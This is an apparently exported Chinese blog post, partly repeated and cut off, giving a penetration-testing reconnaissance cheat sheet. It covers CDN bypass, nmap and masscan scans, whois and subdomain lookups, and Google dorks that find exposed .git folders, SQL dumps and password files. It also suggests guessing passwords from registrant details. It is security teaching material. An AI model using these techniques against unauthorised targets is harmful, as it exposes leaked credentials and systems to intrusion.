###\n\n旁站即同一IP下服务器搭载的不同web应用，一般的旁站查询工具都是使用bing的API，其实直接用google，bing使用`ip:`语法查询也可，这里分享几个在线查询站。\nhttp://www.webscan.cc/\nhttp://s.tool.chinaz.com/same\n\n### WEB应用及容器识别 ###\n\n非常第一网站是修改过的wordpress可以使用wpscan或者尝试/wp-admin /wp-content /readme.html等目录\n\n一般是从HTTP头部、Banner、网站目录、使用的js文件等暴露出来的信息来进行识别\n\nhttps://builtwith.com/ 找出网站是用什么创建的\n\nhttp://www.yunsee.cn/ 云悉 适合国内各种CMS识别\n\nhttps://www.wappalyzer.com/ 有浏览器插件版本\n\nhttps://www.zoomeye.org/ 钟馗之眼偏向WEB应用\n\nhttps://www.shodan.io/ 撒旦之眼偏向网络设备（路由、摄像头等）和服务器\n\n这两个搜索引擎在针对性渗透测试中常用的语法\n`site:`,`hostname:`,`CIDR:`（指定网段）,`port:`,`keyword:`,`ip:`\n\n然后可以搜索cve、expdb、乌云镜像等之类的vuldb网站来查询是否有历史遗留的版本漏洞\n\n\n## 敏感信息泄露 ##\n\n现在越来越多安全问题突破口是通过“人”的方式了，敏感信息泄露就是其中很大的一部分，最近很热门的就是华住的程序员把SQL带明文密码的config文件暴露在github导致了几亿数据的泄露。还有的敏感目录扫描会暴露管理后台、使用的CMS或editor等信息，从而找到exp进行突破。\n\n### google hacking ###\n\ngoogle在安全方面的利用方式已经自成一派,详情可见：\nhttps://www.exploit-db.com/google-hacking-database/\n\n这里只说一下有关敏感信息的常见姿势\n\n敏感文件（.mdb,.excel,.word,.zip,.rar）,查看是否存在源代码泄露。常见有.git文件泄露，.svn文件泄露，.DB_store文件泄露，WEB-INF/web.xml泄露。\n```\n#举例几个常见的语法\n\n#git文件泄露\ninurl:\"/.git/head\"        # https://github.com/lijiejie/GitHack git泄露的利用\n#敏感文件泄露\nfiletype:sql intitle:\"index of\"\nfiletype:mdb intitle:\"index of\"\nintitle:\"index of\" etc\ninurl:service.pwd\nsite:xxx.com filetype:xls,conf intext:pass\n#管理后台\nsite:xxx.com 管理/后台/admin/login\n```\t\ngooglehack也是一个可以很灵活运用的方式，比如当你收集到网站应用目录或者参数的大致命名规律或者指纹信息，就可以用googlehack利用起来试试。\n\n另外推荐一个https://github.com/laramies/theHarvester 利用搜索引擎社工神器\n\n### JS文件敏感信息泄露 ###\n\n参考：http://wooyun.jozxing.cc/static/drops/web-6710.html\n大致分为三类：\n\n1. 泄露后台管理敏感路径或API（参数）\n2. 泄露http-only保护的cookie\n3. 泄露用户敏感信息\n\n### github信息泄露 ###\n\n一个github敏感信息挖掘机供参考：\nhttps://github.com/UnkL4b/GitMiner  GitMiner\n\ngithub敏感信息的搜寻方式大致思路就是利用域名，员工，IP等方式搜索相关源码或配置文件。","source":"_posts/渗透测试备忘之信息收集.md","raw":"---\ntitle: 渗透测试备忘之信息收集\ndate: 2018-09-28 20:20:39\ntags:\n---\n\n# 渗透测试备忘之信息收集 #\n\n整理收集一下渗透测试中信息收集的各种方式方法。\n\n个人把信息手机简单分类为域名相关、IP相关、敏感信息泄露相关三大类，但其实信息收集是一个错综复杂的过程，并不能真正的做分类，仅是为了便于文章书写整理，也不应该局限思维，很多方式方法都可以自由组合使用。\n\n其实社工应当也是很大的一类，但本文不过多讨论社工。\n## IP相关 ##\n\n### 绕过CDN获取真实IP ###\n\n现在大部分大站都使用CDN来快速响应大量用户的请求，在渗透大型网站过程中，拿到真实IP也是必须的，所以先来讨论一下获取真实IP的姿势。\n\n#### 判断是否开启CDN ####\n\nhttp://ping.chinaz.com/  站长之家\nhttps://ping.aizhan.com/  爱站网\n利用一些各地服务器ping同名域名，看各地解析IP是否一致即可判断是否开启CDN\n\nhttp://ipwhois.cnnic.net.cn/ 使用网信中心可以通过IP查到CNNIC及中国大陆的IP地址分配信息，可以确认公司的IP段，并且可以通过公司信息反查IP。\n\n#### 利用国外冷门DNS或子域名 ####\n\n很多网站为了节省资源使用并不会给国外的冷门DNS或者一些多级子域名做CDN，所以在这两方面可能可以直接获取真实IP。\n\n大部分国内网站的CDN都是对内使用的，如果使用国外冷门DNS服务器解析可能可以直接解析到真实IP,下附命令及国外一些DNS服务器:\n\n```\nnslookup http://foo.com 8.8.8.8\n\n/*\nGoogle Public DNS：8.8.8.8、8.8.4.4\n\nNorton DNS：198.153.192.1、198.153.194.1\n\nOpenDNS：208.67.222.222、208.67.220.220\n\nOpenDNS Family：208.67.222.123、208.67.220.123\n\nComodo Secure DNS：156.154.70.22、156.156.71.22\n\nScrubIt DNS：67.138.54.100、207.225.209.66\n\nDNS Advantage：156.154.70.1、156.154.71.1\n*/\n\n```\n#### RSS订阅、邮件订阅等 ####\n\n很多网站提供了RSS或者邮件订阅等服务，服务器向我们发送RSS或者邮件的时候就可以获取到真实的IP，或者同一网段的IP。\n\n#### 利用网络空间搜索器 ####\n\nhttps://fofa.so/ fofa比zoomeye和shodan好的地方就是可以搜索title语法，利用网站title信息来进行查询，成功率很高。\n\n#### 域名解析历史记录查询 ####\n\nhttps://www.virustotal.com/#/domain/foo.com\n\nhttps://toolbar.netcraft.com/site_report?url=foo.com\n\nhttps://x.threatbook.cn/ 微步也可以查到但是部分需要付费\n\n有些网站在使用CDN之前的IP解析也会被历史解析记录到可以试试。\n\n#### 网站自身漏洞泄露 ####\n\n像探针页面、phpinfo页面、或者利用诸如ssrf等漏洞远程访问自己的服务器。\n\n### C段扫描 ###\n\nC段扫描即因为通常情况下机房给予企业的外网IP都是在同一C段下连续的IP，所以可以对IP进行C段扫描看看是否有该目标的其他可突破IP。\n\n可以利用各种搜索引擎（IP为举例）：\ngoogle的`site:192.168.1.*`\nshodan的`net:192.168.1.0/24`\nzoomeyed的`cidr:192.168.1.0/24`\n\n也可以利用一些在线服务：\nhttps://www.5kik.com/c/\nhttp://www.webscan.cc/\n\n或者一些工具：\nhttp://www.91ri.org/7915.html\nhttp://www.7kb.org/817.html\n\n利用Nmap的（比较耗时且使用的是ping方式）\n`namp -sP ip/24 -oN c:\\ip.txt`\n扫描网站服务器c段，并且生成报告\n\n还有很多别的方式这里只是简单举例\n\n### 获得IP之后的端口扫描 ###\n\n中小型企业直接用神器nmap扫描就好，这里主要介绍一下对大型企业大量IP的端口扫描方案：\nmasscan+nmap，利用masscan号称6分钟扫遍全网端口的效率来简单扫描开放的端口，然后利用nmap再进行识别端口的详细扫描。\n相应的命令为`masscan XX.XXX.XX.XXX -p1-65535 --rate 1000`和`-sV -Pn --version-all -v -T4`其中-sV是端口识别；-Pn是跳过发现IP端口的过程，因为这个过程在之前由masscan完成了；--version-all是提高端口识别的准确度，保证对每个端口尝试每个探测报文；-v是使用细节模式提高详细度，可以输出扫描过程的更多信息；-T4，如果用于有足够的带宽或以太网连接，建议使用-T4选项，相对默认扫描能更快。\n接下来就是对端口扫描出来的结果分析利用了。\n\n## 域名相关 ##\n\n### whois ###\n\nhttps://whois.icann.org/en \n\nhttps://www.whois.net/ whois.net\n\nhttps://x.threatbook.cn/ 微步威胁情报查询\n\nhttp://whois.chinaz.com/ 站长之家\n\n可查询到注册人姓名、邮箱、注册地、电话、DNS服务器、注册公司信息等\n\n利用姿势：\n\n1. 对注册人姓名、邮箱、电话进行反查旁站及域名和IP的历史信息\n2. 对注册信息进行社工\n3. 针对以上信息制作弱口令 [猜密码](https://www.w0ai1uo.org/mima/)用于猜解密码\n\n### 网站备案号 ###\n\nhttp://icp.chinaz.com/ 站长之家\n\nhttp://www.miibeian.gov.cn/publish/query/indexFirst.action 工信部备案查询\n\n利用姿势：大中型企业的网络资产中，肯定远不止一个主域名，利用备案反查可以发现同一备案号下很多隐藏的域名。\n\n### SSL证书查询 ###\n\nhttps://censys.io/ \n\nhttps://crt.sh/\n\nhttps://myssl.com/\n\nhttps://www.chinassl.net/ssltools/ssl-checker.html\n\n利用姿势：一样是利用反查来查询隐藏的主域名。\n\n### 子域名、目录挖掘\n\n[子域名枚举备忘录](https://pentester.land/cheatsheets/2018/11/14/subdomains-enumeration-cheatsheet.html)\n\n#### 爬虫式扫描\n\n使用爬虫逐级遍历目录例如awvs的目录扫描以及burp的spider等工具\n\n#### 字典扫描\n\n字典扫描的重点还是在于字典\n\n目录扫描工具：\nhttps://github.com/Strikersb/webdirscan  王松写的目录扫描器\n御剑\n\n子域名扫描工具\nhttps://github.com/lijiejie/subDomainsBrute 高并发的DNS暴力枚举 优势在于速度快\nhttps://www.waitalone.cn/seay-layer-42.html Layer子域名挖掘机 优势在于可以探测端口、服务器信息、服务器状态\nhttps://phpinfo.me/domain/ 某大佬的在线子域名爆破|Domain fuzz\n\n\n#### 利用搜索引擎：\n\n常用google、bing，扫子域名的常用语法 `site:`，其中bing提供了API，很多子域名扫描机也是基于bing的API实现的，详情请见：[bing-web-search-api](https://azure.microsoft.com/en-us/services/cognitive-services/bing-web-search-api/)\n\n### 旁站查询 ###\n\n旁站即同一IP下服务器搭载的不同web应用，一般的旁站查询工具都是使用bing的API，其实直接用google，bing使用`ip:`语法查询也可，这里分享几个在线查询站。\nhttp://www.webscan.cc/\nhttp://s.tool.chinaz.com/same\n\n### WEB应用及容器识别 ###\n\n非常第一网站是修改过的wordpress可以使用wpscan或者尝试/wp-admin /wp-content /readme.html等目录\n\n一般是从HTTP头部、Banner、网站目录、使用的js文件等暴露出来的信息来进行识别\n\nhttps://builtwith.com/ 找出网站是用什么创建的\n\nhttp://www.yunsee.cn/ 云悉 适合国内各种CMS识别\n\nhttps://www.wappalyzer.com/ 有浏览器插件版本\n\nhttps://www.zoomeye.org/ 钟馗之眼偏向WEB应用\n\nhttps://www.shodan.io/ 撒旦之眼偏向网络设备（路由、摄像头等）和服务器\n\n这两个搜索引擎在针对性渗透测试中常用的语法\n`site:`,`hostname:`,`CIDR:`（指定网段）,`port:`,`keyword:`,`ip:`\n\n然后可以搜索cve、expdb、乌云镜像等之类的vuldb网站来查询是否有历史遗留的版本漏洞\n\n\n## 敏感信息泄露 ##\n\n现在越来越多安全问题突破口是通过“人”的方式了，敏感信息泄露就是其中很大的一部分，最近很热门的就是华住的程序员把SQL带明文密码的config文件暴露在github导致了几亿数据的泄露。还有的敏感目录扫描会暴露管理后台、使用的CMS或editor等信息，从而找到exp进行突破。\n\n### google hacking ###\n\ngoogle在安全方面的利用方式已经自成一派,详情可见：\nhttps://www.exploit-db.com/google-hacking-database/\n\n这里只说一下有关敏感信息的常见姿势\n\n敏感文件（.mdb,.excel,.word,.zip,.rar）,查看是否存在源代码泄露。常见有.git文件泄露，.svn文件泄露，.DB_store文件泄露，WEB-INF/web.xml泄露。\n```\n#举例几个常见的语法\n\n#git文件泄露\ninurl:\"/.git/head\"        # https://github.com/lijiejie/GitHack git泄露的利用\n#敏感文件泄露\nfiletype:sql intitle:\"index of\"\nfiletype:mdb intitle:\"index of\"\nintitle:\"index of\" etc\ninurl:service.pwd\nsite:xxx.com filetype:xls,conf intext:pass\n#管理后台\nsite:xxx.com 管理/后台/admin/login\n```\t\ngooglehack也是一个可以很灵活运用的方式，比如当你收集到网站应用目录或者参数的大致命名规律或者指纹信息，就可以用googlehack利用起来试试。\n\n另外推荐一个https://github.com/laramies/theHarvester 利用搜索引擎社工神器\n\n### JS文件敏感信息泄露 ###\n\n参考：http://wooyun.jozxing.cc/static/drops/web-6710.html\n大致分为三类：\n\n1. 泄露后台管理敏感路径或API（参数）\n2. 泄露http-only保护的cookie\n3. 泄露用户敏感信息\n\n### github信息泄露 ###\n\n一个github敏感信息挖掘机供参考：\nhttps://github.com/UnkL4b/GitMiner  GitMiner\n\ngithub敏感信息的搜寻方式大致思路就是利用域名，员工，IP等方式搜索相关源码或配置文件。","slug":"渗透测试备忘之信息收集","published":1,"updated":"2018-12-05T20:51:16.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjrod1l6n0005143a3o0zdi4c","content":"<h1 id=\"渗透测试备忘之信息收集\"><a href=\"#渗透测试备忘之信息收集\" class=\"headerlink\" title=\"渗透测试备忘之信息收集\"></a>渗透测试备忘之信息收集</h1><p>整理收集一下渗透测试中信息收集的各种方式方法。</p>\n<p>个人把信息手机简单分类为域名相关、IP相关、敏感信息泄露相关三大类，但其实信息收集是一个错综复杂的过程，并不能真正的做分类，仅是为了便于文章书写整理，也不应该局限思维，很多方式方法都可以自由组合使用。</p>\n<p>其实社工应当也是很大的一类，但本文不过多讨论社工。</p>\n<h2 id=\"IP相关\"><a href=\"#IP相关\" class=\"headerlink\" title=\"IP相关\"></a>IP相关</h2><h3 id=\"绕过CDN获取真实IP\"><a href=\"#绕过CDN获取真实IP\" class=\"headerlink\" title=\"绕过CDN获取真实IP\"></a>绕过CDN获取真实IP</h3><p>现在大部分大站都使用CDN来快速响应大量用户的请求，在渗透大型网站过程中，拿到真实IP也是必须的，所以先来讨论一下获取真实IP的姿势。</p>\n<h4 id=\"判断是否开启CDN\"><a href=\"#判断是否开启CDN\" class=\"headerlink\" title=\"判断是否开启CDN\"></a>判断是否开启CDN</h4><p><a href=\"http://ping.chinaz.com/\" target=\"_blank\" rel=\"noopener\">http://ping.chinaz.com/</a>  站长之家<br><a href=\"https://ping.aizhan.com/\" target=\"_blank\" rel=\"noopener\">https://ping.aizhan.com/</a>  爱站网<br>利用一些各地服务器ping同名域名，看各地解析IP是否一致即可判断是否开启CDN</p>\n<p><a href=\"http://ipwhois.cnnic.net.cn/\" target=\"_blank\" rel=\"noopener\">http://ipwhois.cnnic.net.cn/</a> 使用网信中心可以通过IP查到CNNIC及中国大陆的IP地址分配信息，可以确认公司的IP段，并且可以通过公司信息反查IP。</p>\n<h4 id=\"利用国外冷门DNS或子域名\"><a href=\"#利用国外冷门DNS或子域名\" class=\"headerlink\" title=\"利用国外冷门DNS或子域名\"></a>利用国外冷门DNS或子域名</h4><p>很多网站为了节省资源使用并不会给国外的冷门DNS或者一些多级子域名做CDN，所以在这两方面可能可以直接获取真实IP。</p>\n<p>大部分国内网站的CDN都是对内使用的，如果使用国外冷门DNS服务器解析可能可以直接解析到真实IP,下附命令及国外一些DNS服务器:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nslookup http://foo.com 8.8.8.8</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\">Google Public DNS：8.8.8.8、8.8.4.4</span><br><span class=\"line\"></span><br><span class=\"line\">Norton DNS：198.153.192.1、198.153.194.1</span><br><span class=\"line\"></span><br><span class=\"line\">OpenDNS：208.67.222.222、208.67.220.220</span><br><span class=\"line\"></span><br><span class=\"line\">OpenDNS Family：208.67.222.123、208.67.220.123</span><br><span class=\"line\"></span><br><span class=\"line\">Comodo Secure DNS：156.154.70.22、156.156.71.22</span><br><span class=\"line\"></span><br><span class=\"line\">ScrubIt DNS：67.138.54.100、207.225.209.66</span><br><span class=\"line\"></span><br><span class=\"line\">DNS Advantage：156.154.70.1、156.154.71.1</span><br><span class=\"line\">*/</span><br></pre></td></tr></table></figure>\n<h4 id=\"RSS订阅、邮件订阅等\"><a href=\"#RSS订阅、邮件订阅等\" class=\"headerlink\" title=\"RSS订阅、邮件订阅等\"></a>RSS订阅、邮件订阅等</h4><p>很多网站提供了RSS或者邮件订阅等服务，服务器向我们发送RSS或者邮件的时候就可以获取到真实的IP，或者同一网段的IP。</p>\n<h4 id=\"利用网络空间搜索器\"><a href=\"#利用网络空间搜索器\" class=\"headerlink\" title=\"利用网络空间搜索器\"></a>利用网络空间搜索器</h4><p><a href=\"https://fofa.so/\" target=\"_blank\" rel=\"noopener\">https://fofa.so/</a> fofa比zoomeye和shodan好的地方就是可以搜索title语法，利用网站title信息来进行查询，成功率很高。</p>\n<h4 id=\"域名解析历史记录查询\"><a href=\"#域名解析历史记录查询\" class=\"headerlink\" title=\"域名解析历史记录查询\"></a>域名解析历史记录查询</h4><p><a href=\"https://www.virustotal.com/#/domain/foo.com\" target=\"_blank\" rel=\"noopener\">https://www.virustotal.com/#/domain/foo.com</a></p>\n<p><a href=\"https://toolbar.netcraft.com/site_report?url=foo.com\" target=\"_blank\" rel=\"noopener\">https://toolbar.netcraft.com/site_report?url=foo.com</a></p>\n<p><a href=\"https://x.threatbook.cn/\" target=\"_blank\" rel=\"noopener\">https://x.threatbook.cn/</a> 微步也可以查到但是部分需要付费</p>\n<p>有些网站在使用CDN之前的IP解析也会被历史解析记录到可以试试。</p>\n<h4 id=\"网站自身漏洞泄露\"><a href=\"#网站自身漏洞泄露\" class=\"headerlink\" title=\"网站自身漏洞泄露\"></a>网站自身漏洞泄露</h4><p>像探针页面、phpinfo页面、或者利用诸如ssrf等漏洞远程访问自己的服务器。</p>\n<h3 id=\"C段扫描\"><a href=\"#C段扫描\" class=\"headerlink\" title=\"C段扫描\"></a>C段扫描</h3><p>C段扫描即因为通常情况下机房给予企业的外网IP都是在同一C段下连续的IP，所以可以对IP进行C段扫描看看是否有该目标的其他可突破IP。</p>\n<p>可以利用各种搜索引擎（IP为举例）：<br>google的<code>site:192.168.1.*</code><br>shodan的<code>net:192.168.1.0/24</code><br>zoomeyed的<code>cidr:192.168.1.0/24</code></p>\n<p>也可以利用一些在线服务：<br><a href=\"https://www.5kik.com/c/\" target=\"_blank\" rel=\"noopener\">https://www.5kik.com/c/</a><br><a href=\"http://www.webscan.cc/\" target=\"_blank\" rel=\"noopener\">http://www.webscan.cc/</a></p>\n<p>或者一些工具：<br><a href=\"http://www.91ri.org/7915.html\" target=\"_blank\" rel=\"noopener\">http://www.91ri.org/7915.html</a><br><a href=\"http://www.7kb.org/817.html\" target=\"_blank\" rel=\"noopener\">http://www.7kb.org/817.html</a></p>\n<p>利用Nmap的（比较耗时且使用的是ping方式）<br><code>namp -sP ip/24 -oN c:\\ip.txt</code><br>扫描网站服务器c段，并且生成报告</p>\n<p>还有很多别的方式这里只是简单举例</p>\n<h3 id=\"获得IP之后的端口扫描\"><a href=\"#获得IP之后的端口扫描\" class=\"headerlink\" title=\"获得IP之后的端口扫描\"></a>获得IP之后的端口扫描</h3><p>中小型企业直接用神器nmap扫描就好，这里主要介绍一下对大型企业大量IP的端口扫描方案：<br>masscan+nmap，利用masscan号称6分钟扫遍全网端口的效率来简单扫描开放的端口，然后利用nmap再进行识别端口的详细扫描。<br>相应的命令为<code>masscan XX.XXX.XX.XXX -p1-65535 --rate 1000</code>和<code>-sV -Pn --version-all -v -T4</code>其中-sV是端口识别；-Pn是跳过发现IP端口的过程，因为这个过程在之前由masscan完成了；–version-all是提高端口识别的准确度，保证对每个端口尝试每个探测报文；-v是使用细节模式提高详细度，可以输出扫描过程的更多信息；-T4，如果用于有足够的带宽或以太网连接，建议使用-T4选项，相对默认扫描能更快。<br>接下来就是对端口扫描出来的结果分析利用了。</p>\n<h2 id=\"域名相关\"><a href=\"#域名相关\" class=\"headerlink\" title=\"域名相关\"></a>域名相关</h2><h3 id=\"whois\"><a href=\"#whois\" class=\"headerlink\" title=\"whois\"></a>whois</h3><p><a href=\"https://whois.icann.org/en\" target=\"_blank\" rel=\"noopener\">https://whois.icann.org/en</a> </p>\n<p><a href=\"https://www.whois.net/\" target=\"_blank\" rel=\"noopener\">https://www.whois.net/</a> whois.net</p>\n<p><a href=\"https://x.threatbook.cn/\" target=\"_blank\" rel=\"noopener\">https://x.threatbook.cn/</a> 微步威胁情报查询</p>\n<p><a href=\"http://whois.chinaz.com/\" target=\"_blank\" rel=\"noopener\">http://whois.chinaz.com/</a> 站长之家</p>\n<p>可查询到注册人姓名、邮箱、注册地、电话、DNS服务器、注册公司信息等</p>\n<p>利用姿势：</p>\n<ol>\n<li>对注册人姓名、邮箱、电话进行反查旁站及域名和IP的历史信息</li>\n<li>对注册信息进行社工</li>\n<li>针对以上信息制作弱口令 <a href=\"https://www.w0ai1uo.org/mima/\" target=\"_blank\" rel=\"noopener\">猜密码</a>用于猜解密码</li>\n</ol>\n<h3 id=\"网站备案号\"><a href=\"#网站备案号\" class=\"headerlink\" title=\"网站备案号\"></a>网站备案号</h3><p><a href=\"http://icp.chinaz.com/\" target=\"_blank\" rel=\"noopener\">http://icp.chinaz.com/</a> 站长之家</p>\n<p><a href=\"http://www.miibeian.gov.cn/publish/query/indexFirst.action\" target=\"_blank\" rel=\"noopener\">http://www.miibeian.gov.cn/publish/query/indexFirst.action</a> 工信部备案查询</p>\n<p>利用姿势：大中型企业的网络资产中，肯定远不止一个主域名，利用备案反查可以发现同一备案号下很多隐藏的域名。</p>\n<h3 id=\"SSL证书查询\"><a href=\"#SSL证书查询\" class=\"headerlink\" title=\"SSL证书查询\"></a>SSL证书查询</h3><p><a href=\"https://censys.io/\" target=\"_blank\" rel=\"noopener\">https://censys.io/</a> </p>\n<p><a href=\"https://crt.sh/\" target=\"_blank\" rel=\"noopener\">https://crt.sh/</a></p>\n<p><a href=\"https://myssl.com/\" target=\"_blank\" rel=\"noopener\">https://myssl.com/</a></p>\n<p><a href=\"https://www.chinassl.net/ssltools/ssl-checker.html\" target=\"_blank\" rel=\"noopener\">https://www.chinassl.net/ssltools/ssl-checker.html</a></p>\n<p>利用姿势：一样是利用反查来查询隐藏的主域名。</p>\n<h3 id=\"子域名、目录挖掘\"><a href=\"#子域名、目录挖掘\" class=\"headerlink\" title=\"子域名、目录挖掘\"></a>子域名、目录挖掘</h3><p><a href=\"https://pentester.land/cheatsheets/2018/11/14/subdomains-enumeration-cheatsheet.html\" target=\"_blank\" rel=\"noopener\">子域名枚举备忘录</a></p>\n<h4 id=\"爬虫式扫描\"><a href=\"#爬虫式扫描\" class=\"headerlink\" title=\"爬虫式扫描\"></a>爬虫式扫描</h4><p>使用爬虫逐级遍历目录例如awvs的目录扫描以及burp的spider等工具</p>\n<h4 id=\"字典扫描\"><a href=\"#字典扫描\" class=\"headerlink\" title=\"字典扫描\"></a>字典扫描</h4><p>字典扫描的重点还是在于字典</p>\n<p>目录扫描工具：<br><a href=\"https://github.com/Strikersb/webdirscan\" target=\"_blank\" rel=\"noopener\">https://github.com/Strikersb/webdirscan</a>  王松写的目录扫描器<br>御剑</p>\n<p>子域名扫描工具<br><a href=\"https://github.com/lijiejie/subDomainsBrute\" target=\"_blank\" rel=\"noopener\">https://github.com/lijiejie/subDomainsBrute</a> 高并发的DNS暴力枚举 优势在于速度快<br><a href=\"https://www.waitalone.cn/seay-layer-42.html\" target=\"_blank\" rel=\"noopener\">https://www.waitalone.cn/seay-layer-42.html</a> Layer子域名挖掘机 优势在于可以探测端口、服务器信息、服务器状态<br><a href=\"https://phpinfo.me/domain/\" target=\"_blank\" rel=\"noopener\">https://phpinfo.me/domain/</a> 某大佬的在线子域名爆破|Domain fuzz</p>\n<h4 id=\"利用搜索引擎：\"><a href=\"#利用搜索引擎：\" class=\"headerlink\" title=\"利用搜索引擎：\"></a>利用搜索引擎：</h4><p>常用google、bing，扫子域名的常用语法 <code>site:</code>，其中bing提供了API，很多子域名扫描机也是基于bing的API实现的，详情请见：<a href=\"https://azure.microsoft.com/en-us/services/cognitive-services/bing-web-search-api/\" target=\"_blank\" rel=\"noopener\">bing-web-search-api</a></p>\n<h3 id=\"旁站查询\"><a href=\"#旁站查询\" class=\"headerlink\" title=\"旁站查询\"></a>旁站查询</h3><p>旁站即同一IP下服务器搭载的不同web应用，一般的旁站查询工具都是使用bing的API，其实直接用google，bing使用<code>ip:</code>语法查询也可，这里分享几个在线查询站。<br><a href=\"http://www.webscan.cc/\" target=\"_blank\" rel=\"noopener\">http://www.webscan.cc/</a><br><a href=\"http://s.tool.chinaz.com/same\" target=\"_blank\" rel=\"noopener\">http://s.tool.chinaz.com/same</a></p>\n<h3 id=\"WEB应用及容器识别\"><a href=\"#WEB应用及容器识别\" class=\"headerlink\" title=\"WEB应用及容器识别\"></a>WEB应用及容器识别</h3><p>非常第一网站是修改过的wordpress可以使用wpscan或者尝试/wp-admin /wp-content /readme.html等目录</p>\n<p>一般是从HTTP头部、Banner、网站目录、使用的js文件等暴露出来的信息来进行识别</p>\n<p><a href=\"https://builtwith.com/\" target=\"_blank\" rel=\"noopener\">https://builtwith.com/</a> 找出网站是用什么创建的</p>\n<p><a href=\"http://www.yunsee.cn/\" target=\"_blank\" rel=\"noopener\">http://www.yunsee.cn/</a> 云悉 适合国内各种CMS识别</p>\n<p><a href=\"https://www.wappalyzer.com/\" target=\"_blank\" rel=\"noopener\">https://www.wappalyzer.com/</a> 有浏览器插件版本</p>\n<p><a href=\"https://www.zoomeye.org/\" target=\"_blank\" rel=\"noopener\">https://www.zoomeye.org/</a> 钟馗之眼偏向WEB应用</p>\n<p><a href=\"https://www.shodan.io/\" target=\"_blank\" rel=\"noopener\">https://www.shodan.io/</a> 撒旦之眼偏向网络设备（路由、摄像头等）和服务器</p>\n<p>这两个搜索引擎在针对性渗透测试中常用的语法<br><code>site:</code>,<code>hostname:</code>,<code>CIDR:</code>（指定网段）,<code>port:</code>,<code>keyword:</code>,<code>ip:</code></p>\n<p>然后可以搜索cve、expdb、乌云镜像等之类的vuldb网站来查询是否有历史遗留的版本漏洞</p>\n<h2 id=\"敏感信息泄露\"><a href=\"#敏感信息泄露\" class=\"headerlink\" title=\"敏感信息泄露\"></a>敏感信息泄露</h2><p>现在越来越多安全问题突破口是通过“人”的方式了，敏感信息泄露就是其中很大的一部分，最近很热门的就是华住的程序员把SQL带明文密码的config文件暴露在github导致了几亿数据的泄露。还有的敏感目录扫描会暴露管理后台、使用的CMS或editor等信息，从而找到exp进行突破。</p>\n<h3 id=\"google-hacking\"><a href=\"#google-hacking\" class=\"headerlink\" title=\"google hacking\"></a>google hacking</h3><p>google在安全方面的利用方式已经自成一派,详情可见：<br><a href=\"https://www.exploit-db.com/google-hacking-database/\" target=\"_blank\" rel=\"noopener\">https://www.exploit-db.com/google-hacking-database/</a></p>\n<p>这里只说一下有关敏感信息的常见姿势</p>\n<p>敏感文件（.mdb,.excel,.word,.zip,.rar）,查看是否存在源代码泄露。常见有.git文件泄露，.svn文件泄露，.DB_store文件泄露，WEB-INF/web.xml泄露。</p>\n<pre><code>#举例几个常见的语法\n\n#git文件泄露\ninurl:&quot;/.git/head&quot;        # https://github.com/lijiejie/GitHack git泄露的利用\n#敏感文件泄露\nfiletype:sql intitle:&quot;index of&quot;\nfiletype:mdb intitle:&quot;index of&quot;\nintitle:&quot;index of&quot; etc\ninurl:service.pwd\nsite:xxx.com filetype:xls,conf intext:pass\n#管理后台\nsite:xxx.com 管理/后台/admin/login\n</code></pre><p>googlehack也是一个可以很灵活运用的方式，比如当你收集到网站应用目录或者参数的大致命名规律或者指纹信息，就可以用googlehack利用起来试试。</p>\n<p>另外推荐一个<a href=\"https://github.com/laramies/theHarvester\" target=\"_blank\" rel=\"noopener\">https://github.com/laramies/theHarvester</a> 利用搜索引擎社工神器</p>\n<h3 id=\"JS文件敏感信息泄露\"><a href=\"#JS文件敏感信息泄露\" class=\"headerlink\" title=\"JS文件敏感信息泄露\"></a>JS文件敏感信息泄露</h3><p>参考：<a href=\"http://wooyun.jozxing.cc/static/drops/web-6710.html\" target=\"_blank\" rel=\"noopener\">http://wooyun.jozxing.cc/static/drops/web-6710.html</a><br>大致分为三类：</p>\n<ol>\n<li>泄露后台管理敏感路径或API（参数）</li>\n<li>泄露http-only保护的cookie</li>\n<li>泄露用户敏感信息</li>\n</ol>\n<h3 id=\"github信息泄露\"><a href=\"#github信息泄露\" class=\"headerlink\" title=\"github信息泄露\"></a>github信息泄露</h3><p>一个github敏感信息挖掘机供参考：<br><a href=\"https://github.com/UnkL4b/GitMiner\" target=\"_blank\" rel=\"noopener\">https://github.com/UnkL4b/GitMiner</a>  GitMiner</p>\n<p>github敏感信息的搜寻方式大致思路就是利用域名，员工，IP等方式搜索相关源码或配置文件。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"渗透测试备忘之信息收集\"><a href=\"#渗透测试备忘之信息收集\" class=\"headerlink\" title=\"渗透测试备忘之信息收集\"></a>渗透测试备忘之信息收集</h1><p>整理收集一下渗透测试中信息收集的各种方式方法。</p>\n<p>个人把信息手机简单分类为域名相关、IP相关、敏感信息泄露相关三大类，但其实信息收集是一个错综复杂的过程，并不能真正的做分类，仅是为了便于文章书写整理，也不应该局限思维，很多方式方法都可以自由组合使用。</p>\n<p>其实社工应当也是很大的一类，但本文不过多讨论社工。</p>\n<h2 id=\"IP相关\"><a href=\"#IP相关\" class=\"headerlink\" title=\"IP相关\"></a>IP相关</h2><h3 id=\"绕过CDN获取真实IP\"><a href=\"#绕过CDN获取真实IP\" class=\"headerlink\" title=\"绕过CDN获取真实IP\"></a>绕过CDN获取真实IP</h3><p>现在大部分大站都使用CDN来快速响应大量用户的请求，在渗透大型网站过程中，拿到真实IP也是必须的，所以先来讨论一下获取真实IP的姿势。</p>\n<h4 id=\"判断是否开启CDN\"><a href=\"#判断是否开启CDN\" class=\"headerlink\" title=\"判断是否开启CDN\"></a>判断是否开启CDN</h4><p><a href=\"http://ping.chinaz.com/\" target=\"_blank\" rel=\"noopener\">http://ping.chinaz.com/</a>  站长之家<br><a href=\"https://ping.aizhan.com/\" target=\"_blank\" rel=\"noopener\">https://ping.aizhan.com/</a>  爱站网<br>利用一些各地服务器ping同名域名，看各地解析IP是否一致即可判断是否开启CDN</p>\n<p><a 